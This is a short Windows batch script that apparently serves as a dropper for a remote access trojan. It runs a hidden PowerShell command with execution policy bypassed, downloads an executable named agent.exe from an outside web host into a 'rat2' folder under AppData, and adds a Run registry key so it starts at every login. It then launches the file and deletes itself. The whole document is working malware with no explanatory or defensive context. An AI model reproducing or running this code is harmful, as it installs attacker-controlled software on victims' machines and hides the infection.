@echo off
powershell -w hidden -ep bypass -c "$d=[Environment]::GetFolderPath('ApplicationData')+'\rat2';New-Item -ItemType Directory -Force -Path $d|Out-Null;$e=$d+'\agent.exe';(New-Object Net.WebClient).DownloadFile('https://rat2-delta.vercel.app/agent.exe',$e);Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' 'rat2' $e;Start-Process $e"
(goto) 2>nul & del "%~f0"
